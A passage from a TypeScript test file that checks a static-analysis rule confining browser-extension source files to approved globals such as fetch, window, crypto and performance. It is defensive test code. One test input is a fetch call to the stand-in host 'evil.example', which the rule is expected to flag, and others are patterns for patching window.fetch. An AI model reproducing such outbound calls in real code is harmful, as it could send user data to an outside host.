      await reached('src/background/shot.ts', 'const ratio = window.devicePixelRatio || 1;'),
    ).toEqual([]);
    expect(await reached('src/background/shot.ts', 'const w = window.document;')).not.toEqual([]);
    expect(
      await reached('src/background/shot.ts', "const b = btoa('x') + String.fromCharCode(1);"),
    ).toEqual([]);
    expect(
      await reached('src/background/shot.ts', "await fetch(url, { credentials: 'omit' });"),
    ).toEqual([]);
    expect(
      await reached('src/result/render.ts', "await fetch('https://evil.example/');"),
    ).not.toEqual([]);
    expect(await reached('src/shared/ui.ts', 'await fetch(url);')).not.toEqual([]);
    // the shared capture codec
    expect(await reached('src/shared/capture.ts', 'const c = globalThis.crypto;')).toEqual([]);
    expect(await reached('src/shared/capture.ts', 'const c = globalThis.fetch;')).not.toEqual([]);
    expect(await reached('src/result/render.ts', 'const c = globalThis.crypto;')).not.toEqual([]);
    expect(await reached('src/shared/capture.ts', 'const m = decodeURIComponent(s);')).toEqual([]);
    expect(await reached('src/result/render.ts', 'const m = decodeURIComponent(s);')).not.toEqual(
      [],
    );
    // the runtime: one performance read, the descriptor read, the thread count
    const model =
      'const isolated = globalThis.crossOriginIsolated; const e = performance.getEntriesByType("resource"); ' +
      "const d = Object.getOwnPropertyDescriptor(o, 'x'); const r = await fetch(u);";
    expect(await reached('src/result/model.ts', model)).toEqual([]);
    expect(await reached('src/result/app.ts', model)).not.toEqual([]);
    expect(await reached('src/result/model.ts', 'performance.clearResourceTimings();')).not.toEqual(
      [],
    );
    expect(
      await reached('src/result/model.ts', 'performance.setResourceTimingBufferSize(0);'),
    ).not.toEqual([]);
    // the welcome page detects a Chrome event
    expect(await reached('src/welcome/app.ts', "const has = 'x' in chrome.action;")).toEqual([]);
    expect(await reached('src/result/app.ts', "const has = 'x' in chrome.action;")).not.toEqual([]);
  });

  it('is shadow-aware: a local variable that shares the name of a global is not the global', async () => {
    expect(
      await reached(
        'src/result/render.ts',
        'function f(top: number, parent: string) { const self = top + 1; return [top, parent, self]; }',
      ),
    ).toEqual([]);
    expect(
      await reached('src/result/render.ts', 'const top = rows.slice(0, 5); use(top);'),
    ).toEqual([]);
  });

  describe('the two pages that listen to their window', () => {
    const PAGES = ['src/result/app.ts', 'src/welcome/app.ts'];
    it('hold it in `win` and use it for win.location and win.addEventListener only', async () => {
      const ok =
        'const win = doc.defaultView; if (!win) return; const h = win.location.hash; ' +
        "win.addEventListener('hashchange', render); win.addEventListener('pagehide', stop);";
      for (const file of PAGES) expect(await flagged(file, ok), file).toEqual([]);
    });

    it.each([
      ['another name', 'const w = doc.defaultView;'],
      [
        'an object to assign to',
        'const win = doc.defaultView; Object.assign(win, { fetch: patched });',
      ],
      ['win passed on', 'const win = doc.defaultView; use(win);'],
      ['win.fetch', 'const win = doc.defaultView; win.fetch = patched;'],
      ['win.top', 'const win = doc.defaultView; const t = win.top;'],
      ['win.document', 'const win = doc.defaultView; const d = win.document;'],
      ['a computed member', "const win = doc.defaultView; win['fetch'] = patched;"],
      ['an alias', 'const win = doc.defaultView; const w = win;'],
      ['a second source', 'const win = doc.defaultView; const x = frame.contentWindow;'],
      ['a destructured defaultView', 'const { defaultView: win } = doc;'],
      ['a computed defaultView', "const win = doc['defaultView'];"],
    ])('refuse %s', async (_what, code) => {
      for (const file of PAGES)
        expect(await flagged(file, code), `${file}: ${code}`).not.toEqual([]);
    });

    it('is not allowed anywhere else', async () => {
      expect(
        await flagged('src/result/render.ts', 'const win = doc.defaultView; win.location.hash;'),
      ).not.toEqual([]);
    });
  });
});
